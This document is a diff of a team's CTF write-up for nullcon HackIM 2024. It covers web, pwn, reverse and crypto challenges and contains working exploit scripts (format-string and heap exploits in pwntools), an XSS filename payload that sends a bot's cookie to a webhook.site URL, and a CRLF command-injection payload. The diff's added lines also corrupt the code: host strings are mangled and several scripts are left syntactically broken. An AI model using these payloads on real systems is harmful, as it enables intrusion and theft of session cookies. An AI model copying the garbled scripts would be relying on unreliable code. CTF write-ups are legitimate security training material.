@@ -2,13 +2,13 @@
 title: nullcon HackIM CTF 2024, Berlin
 date: '2024-03-22'
 draft: false
-tags: ['Writeups']
+tags: ['Web', 'Pwn', 'Misc', 'Crypto']
 summary: nullcon HackIM CTF 2024, Berlin Writeup.
 ---
 
 # Nullcon HackIM CTF 2024, Berlin
 
-### ![chall-sc](https://hackmd.io/_uploads/HyDSeGP0T.png)
+![chall-sc](https://hackmd.io/_uploads/HyDSeGP0T.png)
 
 On 14th and 15th March 2024, `SNI` participated in the `Nullcon HackIM CTF 2024`. We are very grateful to announce that we achieved the `3rd rank` on the leaderboard. Additionally, we secured the `2nd rank` specifically in the `Online Category` leaderboard. These are our writeups for the challenges that we solved during the CTF.
 
@@ -16,11 +16,11 @@ On 14th and 15th March 2024, `SNI` participated in the `Nullcon HackIM CTF 2024`
 
 ## sanity proof
 
-### ![chall-sc](https://hackmd.io/_uploads/SJIfZ3IRp.png)
+> Read the rules and find flag
 
 This is a Bonus Challenge
 
-![chall-sc](https://hackmd.io/_uploads/ryT5ZhL06.png)
+![images](https://hackmd.io/_uploads/ryT5ZhL06.png)
 
 Flag: `ENO{th1s_is_4n_eXample}`
 
@@ -28,7 +28,9 @@ Flag: `ENO{th1s_is_4n_eXample}`
 
 ## faleval
 
-### ![chall-sc](https://hackmd.io/_uploads/rJ2pDjLRp.png)
+> My friend makes ymmuy faleval, but sometimes he mixes up thingsm but what can you do? \
+> **Author:** @gehaxelt \
+> **Conn:** 52.59.124.14:5000
 
 ```php
 <?php
@@ -84,13 +86,15 @@ Flag: `ENO{YummY_YummY_Falafel_Expl01tz}`
 
 ## Bassy
 
-### ![chall-sc](https://hackmd.io/_uploads/B1cS0_W0p.png)
+> Do you like bass(e)? We only know that the admin's encoded password begins with 'OP)s'... \
+> **Author:** @gehaxelt \
+> **Conn:** 52.59.124.14:5008
 
 Theory: https://stackoverflow.com/questions/12598407/why-does-php-convert-a-string-with-the-letter-e-into-a-number
 
-> Other answers have already mentioned this, but the PHP manual has explicitly stated it now. PHP interprets any string containing an 'E' bounded by numbers as scientific notation (EXPONENT*DNUM: (\{LNUM} \{DNUM}) [eE][+-]?\{LNUM}). As you can see, this interpretation is case-insensitive (E or e). Where this becomes a `gotcha` in weak type string comparisons var_dump("2E1" == "020"); // true 2E1 is really 2 * (10 ^ 1), and that works out to 20. Insert any other letter there and it will return the expected false. From the question "608E-4234" == "272E-3063" That works out to 608 \_ (10 ^ -4234) == 272 \* (10 ^ -3063) Neither number can be represented by PHP (as JvdBerg noted), so they are converted to 0
+> Other answers have already mentioned this, but the PHP manual has explicitly stated it now. PHP interprets any string containing an 'E' bounded by numbers as scientific notation (EXPONENT_DNUM: (\{LNUM} \{DNUM}) [eE][+-]?\{LNUM}). As you can see, this interpretation is case-insensitive (E or e). Where this becomes a `gotcha` in weak type string comparisons var_dump("2E1" == "020"); // true 2E1 is really 2 \* (10 ^ 1), and that works out to 20. Insert any other letter there and it will return the expected false. From the question "608E-4234" == "272E-3063" That works out to 608 \_ (10 ^ -4234) == 272 \* (10 ^ -3063) Neither number can be represented by PHP (as JvdBerg noted), so they are converted to 0
 
-### ![chall-sc](https://hackmd.io/_uploads/SJ83Ci8R6.png)
+### ![images](https://hackmd.io/_uploads/SJ83Ci8R6.png)
 
 Based on the given source code, we are asked to input a password for the admin account. The parameters are as follows:
 
@@ -101,13 +105,15 @@ Based on the given source code, we are asked to input a password for the admin a
 
 Lets try with: 1+ª. Input to Burpsuite Repeater:
 
-### ![chall-sc](https://hackmd.io/_uploads/BkOZAsUCT.png)
+### ![images](https://hackmd.io/_uploads/BkOZAsUCT.png)
 
 Flag: `ENO{B4sE_85_L0l_0KaY_1337}`
 
 ## Trafficking
 
-### ![chall-sc](https://hackmd.io/_uploads/H1UI0ub0a.png)
+> The internet is full of traffic and people implement their own traffcki ng tools.„ so what could 80 wrong? \
+> **Author:** @gehaxelt \
+> **Conn:** 52.59.124.14:5006
 
 ```python
 import logging
@@ -143,52 +149,54 @@ while 1:
 
 The code requires us to create a custom header capable of passing the given parameters. We'll utilize Burp Suite to generate this custom header. The access must be made with the vhost 'smuggly', the host as localhost, and directed to the endpoint '/admin'
 
-![chall-sc](https://hackmd.io/_uploads/rJkC0ObCp.png)
+![images](https://hackmd.io/_uploads/rJkC0ObCp.png)
 
 Flag: `ENO{OH_TH4T_W4S_T00_EAZZ1}`
 
 ## The Fast Falafel Shop
 
-### ![chall-sc](https://hackmd.io/_uploads/BJqAOjLRa.png)
+> Because @gehaxelt loves Falafel so much, I built a website for him ;) Hurry up though, the contest is not gonna last forever. \
+> **Author:** @moaath \
+> **Connection: 52**.59.124.14:5010\*\*
+> **Attachment:** source.zip
 
 ```php
 <?php
-                $files = $_FILES["fileToUpload"];
-                    $target_dir = "uploads/" . $files["name"];
-                if ($files["name"] != "") {
-                    $target_dir = "uploads/" . $files["name"];
-                    if(strpos($target_dir,"..") !== false){
-                        echo "Sorry, there was an error while uploading! <br>";
-                        http_response_code(403);
-                      }
-                      move_uploaded_file($files["tmp_name"], $target_dir);
-                    if (checkViruses($target_dir) && checkFileType($target_dir)) {
-                        echo "<a href='$target_dir'>uploaded chall-sc!</a>";
-                    } else {
-                        unlink($target_dir);
-                        echo "Sorry, there was an error while uploading! <br>";
-                        http_response_code(403);
-                    }
+$files = $_FILES["fileToUpload"];
+  $target_dir = "uploads/" . $files["name"];
+if ($files["name"] != "") {
+  $target_dir = "uploads/" . $files["name"];
+  if(strpos($target_dir,"..") !== false){
+      echo "Sorry, there was an error while uploading! <br>";
+      http_response_code(403);
+    }
+    move_uploaded_file($files["tmp_name"], $target_dir);
+  if (checkViruses($target_dir) && checkFileType($target_dir)) {
+      echo "<a href='$target_dir'>uploaded images!</a>";
+  } else {
+      unlink($target_dir);
+      echo "Sorry, there was an error while uploading! <br>";
+      http_response_code(403);
+  }
+}
 
-                }
+function checkViruses($fileName)
+{
+  $hash = password_hash($fileName, PASSWORD_BCRYPT, ["cost" => 12]);
+  return !password_verify("uploads/exploit.php", $hash);
+}
 
-                function checkViruses($fileName)
-                {
-                    $hash = password_hash($fileName, PASSWORD_BCRYPT, ["cost" => 12]);
-                    return !password_verify("uploads/exploit.php", $hash);
-                }
-
-                function checkFileType($fileName)
-                {
-                    $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
-                    if ($extension != "jpg" && $extension != "png") {
-                        echo "Sorry, only JPG & PNG files are allowed <br>";
-                        return false;
-                    } else {
-                        return true;
-                    }
-                }
-                ?>
+function checkFileType($fileName)
+{
+  $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+  if ($extension != "jpg" && $extension != "png") {
+      echo "Sorry, only JPG & PNG files are allowed <br>";
+      return false;
+  } else {
+      return true;
+  }
+}
+?>
 ```
 
 The file will first be moved to the public folder and then removed if the condition is not met. There is a race condition where the checkViruses function, which is computationally expensive, can be accessed before the file is deleted.
@@ -197,7 +205,12 @@ Flag: `ENO{D0N'T_ST0R3_F1L3S_B3F0R3_VAL1DAT1NG_TH3M}`
 
 ## The Fast Falafel Shop 2
 
-### ![chall-sc](https://hackmd.io/_uploads/ByNXKjLAT.png)
+> It looks like our page had a bug :( We did fix it tho! And we even added a little treat for you guys! (But dont tell @gehaxelt about our secret) \
+> **Author:** @moaath,@layton \
+> **Connection: 52**.59.124.14:5012\*\*
+> **Attachment:** docker-compose.yml, shop.zip
+
+````php
 
 Objective: Obtain the flag in a cookie with the domain `shop`.
 
@@ -220,7 +233,7 @@ Objective: Obtain the flag in a cookie with the domain `shop`.
     await asyncio.sleep(3)
     await browser.close()
     print(url)
-```
+````
 
 The Docker hostname will be `shop`, so `http://shop` refers to localhost, and `secret.php` is the bot.
 
@@ -238,7 +251,7 @@ if (isset($_POST["url"])) {
 There was XSS in contest.php
 
 ```php
-echo "<a href='$target_dir'>uploaded chall-sc!</a>";
+echo "<a href='$target_dir'>uploaded images!</a>";
 ```
 
 If the filename is `'><script>alert(1)</script>x.png` the output should be
@@ -248,7 +261,7 @@ If the filename is `'><script>alert(1)</script>x.png` the output should be
   ><script>
     alert(1)
   </script>
-  .png>uploaded chall-sc!</a
+  .png>uploaded images!</a
 >
 ```
 
@@ -263,7 +276,7 @@ Then the alert will be trigerred since there was no csrf protection and we can t
     ['foo'],
     "foo'><svg onload=eval(atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZGE0NWViMTctYzIzZC00NmViLWE2N2ItZGE3MTY4ZWE1MDhi=='))>.jpg",
     {
-      type: 'chall-sc/jpeg',
+      type: 'images/jpeg',
     }
   )
 
@@ -279,7 +292,9 @@ Then the alert will be trigerred since there was no csrf protection and we can t
 
 ## traversaller
 
-### ![chall-sc](https://hackmd.io/_uploads/S1hvYoLCp.png)
+> Do you have fun travelling through different filesystems? \
+> **Author:** @gehaxelt \
+> **Conn:** 52.59.124.14:5017
 
 ```php
 <?php
@@ -323,19 +338,21 @@ Flag: `ENO{PhP_P4tH-Tr4vers4L_FuN!}`
 
 ## executy
 
-### ![chall-sc](https://hackmd.io/_uploads/BJlqKyLCp.png)
+> Some things are just so cutey sometimes :) \
+> **Author:** @gehaxelt \
+> **Conn:** 52.59.124.14:5005
 
 We were given a website where we can execute a bash command on the following input box
 
-### ![chall-sc](https://hackmd.io/_uploads/SkC2Fk806.png)
+### ![images](https://hackmd.io/_uploads/SkC2Fk806.png)
 
 We can also see the source code of the website and it uses php. Long story short, our bash command input will be checked whether it matches what is in the $THE_SCRIPT variable or not. If it is different, then the command we give will not be executed.
 
-![chall-sc](https://hackmd.io/_uploads/H11apkIRT.png)
+![images](https://hackmd.io/_uploads/H11apkIRT.png)
 
 We discovered something interesting, the bash command we input is not directly compared to the $THE_SCRIPT variable. Instead, it's captured using a hardcopy screen. Subsequently, the web application uses the trim function to extract the text that will be compared with $THE_SCRIPT. We can exploit this behavior to launch a CLRF (Carriage Return Line Feed) attack.
 
-![chall-sc](https://hackmd.io/_uploads/H1y3xxU0a.png)
+![images](https://hackmd.io/_uploads/H1y3xxU0a.png)
 
 #### POC
 
@@ -345,7 +362,7 @@ With the following payload, we can create a trim function that ignores arbitrary
 %23%21%2Fbin%2Fsh%0Acat%20*%20#%0Dcat+flag.txt%3B
 ```
 
-![chall-sc](https://hackmd.io/_uploads/HJjpzgI06.png)
+![images](https://hackmd.io/_uploads/HJjpzgI06.png)
 
 Flag: `ENO{BEWARE_OF_TERM1N4L_3SCAPE_SEQUENCES!}`
 
@@ -353,7 +370,10 @@ Flag: `ENO{BEWARE_OF_TERM1N4L_3SCAPE_SEQUENCES!}`
 
 ## baby_formatter
 
-### ![chall-sc](https://hackmd.io/_uploads/HJH1wDEAa.png)
+> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge one of the series. \
+> **Author:** @moaath \
+> **Connection: 52**.59.124.14:5030\*\*
+> **Attachment:** baby_formatter
 
 In this challenge, we were given a binary named `baby_formatter`. First, let's see what mitigations the binary file has.
 
@@ -412,7 +432,7 @@ elf = context.binary = ELF(exe, checksec = 0)
 context.bits = 64
 context.log_level = 'debug'
 context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
-host, port = "nc 52.59.124.14 5030".split(" ")[1:3]
+host, port = "nc Connection: 52.59.124.14 503**0".split(" ")[1:
 io = remote(host, port)
 p = '%{}c.'.format(elf.sym.win).encode()
 p += b'%11$ln'
@@ -422,13 +442,16 @@ io.sendline(p)
 io.interactive()
 ```
 
-![chall-sc](https://hackmd.io/_uploads/SJ-0nD406.png)
+![images](https://hackmd.io/_uploads/SJ-0nD406.png)
 
 Flag: `ENO{W3LL_THAT_WA5_AN_3A5Y_0N3_1_GU355}`
 
 ## junior_formatter
 
-### ![chall-sc](https://hackmd.io/_uploads/ByRspwVCa.png)
+> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge two of the series. \
+> **Author:** @moaath \
+> **Connection: 52**.59.124.14:5031\*\*
+> **Attachment:** junior_formatter, Dockerfile
 
 In this challenge, we were given a binary named `junior_formatter` and a Dockerfile that states the binary is built using Ubuntu 22:04. From this information, we can conclude that the glibc version is glibc version 2.35. Now, let's analyze the mitigations present in the binary file.
 
@@ -525,7 +548,7 @@ elf = context.binary = ELF(exe, checksec = 0)
 context.bits = 64
 context.log_level = 'debug'
 context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
-host, port = "nc 52.59.124.14 5031".split(" ")[1:3]
+host, port = "nc Connection: 52.59.124.14 503**1".split(" ")[1:
 io = remote(host, port)
 sla = lambda a, b: io.sendlineafter(a, b)
 sa = lambda a, b: io.sendafter(a, b)
@@ -561,15 +584,18 @@ sla(b'>> ', p)
 com()
 ```
 
-![chall-sc](https://hackmd.io/_uploads/Sk1OXXr06.png)
+![images](https://hackmd.io/_uploads/Sk1OXXr06.png)
 
 Flag: `ENO{N1C3_Y0U_G0T_TH15_0N3_T00_G00D_J0B!}`
 
 ## Hangman
 
-### ![chall-sc](https://hackmd.io/_uploads/SyP9cyGAT.png)
+> We love C and we love games. So we decided to implement a simple game to test our C knowledge! Go and have a look at the coolest Hangman game ever made! \
+> **Authors:** @anajana, @moaath
+> **Connection: 52**.59.124.14:5029\*\*
+> **Attachment:** hangman, Dockerfile
 
-In this challenge, we were given a binary named `hangman` along with a Dockerfile. First, let's see what mitigations the binary file has.
+In this challenge, we were given a binary named `hangman` along with a `Dockerfile`. First, let's see what mitigations the binary file has.
 
 ```
     Arch:     amd64-64-little
@@ -795,7 +821,7 @@ def start():
     return remote(args.HOST or host, args.PORT or port)
 
 
-host, port = "52.59.124.14", 5020
+host, port = "Connection: 52**.59.124.14", 50
 exe = context.binary = ELF("./hangman_patched")
 libc = ELF("./libc.so.6", False)
 cdll = CDLL("libc.so.6")
@@ -846,13 +872,16 @@ io.sendlineafter(b">> ", b"3")
 io.interactive()
 ```
 
-### ![chall-sc](https://hackmd.io/_uploads/BJTu-QMAT.png)
+### ![images](https://hackmd.io/_uploads/BJTu-QMAT.png)
 
 Flag: `ENO{HANG_0N_T3HR3_B0DY_1T5_0NLY_0FF_BY_0N3_3RR0R_W1TH_S0M3_LUCK!}`
 
 ## SENIOR_formatter
 
-![chall-sc](https://hackmd.io/_uploads/H14AdQSAT.png)
+> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge three of the series. \
+> **Author:** @moaath \
+> **Connection: 52**.59.124.14:5032\*\*
+> **Attachment:** senior_formatter, Dockerfile
 
 In this challenge, we were given a binary named `senior_formatter` and a Dockerfile that states the binary is built using Ubuntu 22:04. From this information, we can conclude that the glibc version is glibc version 2.35. Now, let's analyze the mitigations present in the binary file.
 
@@ -1003,7 +1032,7 @@ elf = context.binary = ELF(exe, checksec = 0)
 context.bits = 64
 context.log_level = 'debug'
 context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
-host, port = "nc 52.59.124.14 5032".split(" ")[1:3]
+host, port = "nc Connection: 52.59.124.14 503**2".split(" ")[1:
 io = remote(host, port)
 sla = lambda a, b: io.sendlineafter(a, b)
 sa = lambda a, b: io.sendafter(a, b)
@@ -1064,7 +1093,7 @@ sla(b'>> ', b'3')
 com()
 ```
 
-### ![chall-sc](https://hackmd.io/_uploads/rJgZ-HH06.png)
+### ![images](https://hackmd.io/_uploads/rJgZ-HH06.png)
 
 Flag: `ENO{WA1T_WHAT_H0W_D1D_Y0U_F1ND_M3???}`
 
@@ -1072,20 +1101,30 @@ Flag: `ENO{WA1T_WHAT_H0W_D1D_Y0U_F1ND_M3???}`
 
 ## missingcat
 
-### ![chall-sc](https://hackmd.io/_uploads/BkNLPi80p.png)
+> Missing cat \
+> Where is my cat? \
+> **Author:** @gehaxelt \
+> **Connection: 52**.59.124.14:5001\*\*
+> **Attachment:** chall.py
 
 Given a challenge with the following source:
-![chall-sc](https://hackmd.io/_uploads/ryOgBxUA6.png)
+![images](https://hackmd.io/_uploads/ryOgBxUA6.png)
 
 Although there is an initial check, the command below will still be executed so we just enter the command that outputs the contents of the flag.txt file, which is tac or cat (The intended one using nl actually).
 
-### ![chall-sc](https://hackmd.io/_uploads/SJ9gExIAp.png)
+### ![images](https://hackmd.io/_uploads/SJ9gExIAp.png)
 
 Flag: `ENO{0xCAT_BUT_H4PP1_THANK_Y0U!}`
 
 ## Lost in Parity
 
-### ![chall-sc](https://hackmd.io/_uploads/rkhJLbwCp.png)
+> Lost in Parity \
+> I deleted the flag. \
+>
+> > python3 xor.py ./f\* > xor \
+> > rm xor.py flag.txt \
+> > **Author:** @miko \
+> > **Attachment:** data.zip
 
 We are given a data.zip file containing 256 files named `file0` to `file255` and another file `xor`. From the description, we can asume that the `xor` file is the result of xor-ing those 256 files and also the flag.txt. Knowing that in mind, we can recover the flag.txt from xor-ing `file0` until `file255` and also `xor`.
 
@@ -1110,11 +1149,14 @@ Flag: `ENO{R41D1NG_F1L3S_4R3_W3?}`
 
 ## Itchy Route
 
-### ![chall-sc](https://hackmd.io/_uploads/rJIOhyzRp.png)
+> Itchy Route \
+> Get straight to the point and list your options! \
+> **Author:** @miko \
+> **Conn:** 52.59.124.14:5002
 
 Given an IP address and the port that we can connect using `nc`. Once connected to it, we won't see anything, but after we give an input, it will give us a message.
 
-### ![chall-sc](https://hackmd.io/_uploads/HJp1oxUAp.png)
+### ![images](https://hackmd.io/_uploads/HJp1oxUAp.png)
 
 After experimenting with it, i found out that almost all the characters have been banned. So our initial step is to find out what characters are allowed.
 
@@ -1125,7 +1167,7 @@ import string
 
 whitelist = []
 for c in string.printable:
-    io = remote("52.59.124.14", 5002)
+    io = remote("Connection: 52**.59.124.14", 500
     io.sendline(c.encode())
     if b"illegal" not in io.recvline():
         whitelist.append(c)
@@ -1136,7 +1178,7 @@ print(whitelist)
 
 Using the script above, we get the allowed characters are `0cnCN./?`. So, after that, i test some characters and while testing `.` character, i came to realization that the server was executing `ls` command.
 
-### ![chall-sc](https://hackmd.io/_uploads/rk0ay-LCT.png)
+### ![images](https://hackmd.io/_uploads/rk0ay-LCT.png)
 
 When i input `0cn` to the server, the server tells us what to do. We have to look for another folder named `0cn` in the filesystem with the restriction that we can only use a few characters.
 
@@ -1169,7 +1211,7 @@ context.log_level = "WARN"
 prog = log.progress("Current path", level=logging.WARN)
 for path in paths:
     prog.status(path.decode())
-    io = remote("52.59.124.14", 5002)
+    io = remote("Connection: 52**.59.124.14", 500
     io.sendline(replace_blacklisted(path))
     resp = io.recvall()
     if b"ENO" not in resp:
@@ -1186,7 +1228,7 @@ for path in paths:
 
 I got the flag after a few minutes.
 
-### ![chall-sc](https://hackmd.io/_uploads/HkpKQWLCp.png)
+### ![images](https://hackmd.io/_uploads/HkpKQWLCp.png)
 
 Flag: `ENO{4NY_M0R3_QU35T10N5M4RK5_0C?N?}`
 
@@ -1194,7 +1236,9 @@ Flag: `ENO{4NY_M0R3_QU35T10N5M4RK5_0C?N?}`
 
 ## revhell
 
-### ![chall-sc](https://hackmd.io/_uploads/B1cW6kz0a.png)
+> Step into the shadows of the Forbidden Realms, a realm shrouded in mystery. To breach its gates, one must whisper the correct incantation, a secret phrase concealed in the echoes of darkness that is filled with strange sorcery (the so called fun). \
+> **Author:** @moaath, @anajana \
+> **Attachment:** revhell
 
 Given a binary file named `revhell`. The first step i do is looking the disassembly in IDA.
 
@@ -1309,13 +1353,15 @@ s2 += p64(0x8578EF).strip(b"\0")
 print(xor(s1, s2).decode())
 ```
 
-### ![chall-sc](https://hackmd.io/_uploads/r1OC5-U06.png)
+### ![images](https://hackmd.io/_uploads/r1OC5-U06.png)
 
 Flag: `ENO{h0pe_y0u_h4d_fun_extr4act1ng_my_secret}`
 
 ## CarryMe
 
-### ![chall-sc](https://hackmd.io/_uploads/HyImT1zC6.png)
+> Let me carry your negative energy away my friend. \
+> **Authors:** @moaath, @Liikt \
+> FLAG hash: 4806d466d3b96fcbc18d050aa9b925d6aa6b4b711167a5b9092efcfba5d7f352 (echo -n "flag" I sha256sum)
 
 In this challenge, we were given a binary file named `carryme`. Disassemble it in IDA to find out what it does.
 
@@ -1468,13 +1514,15 @@ for flag, hash in pool.imap_unordered(
         exit()
 ```
 
-### ![chall-sc](https://hackmd.io/_uploads/SJjACW80T.png)
+### ![images](https://hackmd.io/_uploads/SJjACW80T.png)
 
 Flag: `ENO{N0W_THAT'5_50M3_N3XT_LVL_SBB}`
 
 ## cursedPower
 
-### ![chall-sc](https://hackmd.io/_uploads/S17sc0BCa.png)
+> AHHH The field is full of mines! Screw it! I am going in! \
+> **Author:** @moaath, @Liikt \
+> **Attachment:** script.ps1
 
 In this challenge, we were presented with an obfuscated PowerShell script. Malicious actors frequently employ obfuscation methods to obscure the contents of their PowerShell payloads, making it more difficult to analyze them effectively. One well-known example of this is Cobalt Strike. To analyze such scripts dynamically, tools like Power-Decode can be utilized. You can find the tools [here](https://github.com/Malandrone/PowerDecode).
 
@@ -1482,7 +1530,7 @@ In this challenge, we were presented with an obfuscated PowerShell script. Malic
 
 After running GUI.ps1, we select the automatically decode mode and input the file containing the obfuscated powershell payload. We can see that the flags are defined in the $flag variable.
 
-### ![chall-sc](https://hackmd.io/_uploads/B1hGP1ICa.png)
+### ![images](https://hackmd.io/_uploads/B1hGP1ICa.png)
 
 Flag: `ENO{H0p3fully_Y0ur_M1ND_D1D_G3t_scr3w3D}`
 
@@ -1490,7 +1538,11 @@ Flag: `ENO{H0p3fully_Y0ur_M1ND_D1D_G3t_scr3w3D}`
 
 ## double-trouble
 
-### ![chall-sc](https://hackmd.io/_uploads/ByxbDjHAa.png)
+> What can be better than a Crypto challenge? (kinda anything 101) \
+> A Crypto challenge written in Rust! its double the fun ;) \
+> **Author:** @layton, @anajana, @moaath \
+> **Connection: 52**.59.124.14:5024\*\*
+> **Attachment:** source.zip
 
 In this challenge, we were given a server-side file that is a Rust project and a Dockerfile inside of zip file. First let's see what the program do.
 
@@ -1553,8 +1605,8 @@ from Crypto.Util.number import *
 from pwn import *
 from tqdm import tqdm
 
-# nc 52.59.124.14 5024
-HOST = "52.59.124.14"
+# nc Connection:** 52.59.124.14 50
+HOST = **"Connection: 52.59.124.1
 PORT = 5024
 
 msg = b"A" * 28 + b"\n"
@@ -1585,6 +1637,6 @@ for k in tqdm(product(range(0x100), repeat=3), total=0x100**3):
         break
 ```
 
-### ![chall-sc](https://hackmd.io/_uploads/BywY9iSCT.png)
+### ![images](https://hackmd.io/_uploads/BywY9iSCT.png)
 
 Flag: `ENO{otp_reuse_rethink_rewind}`
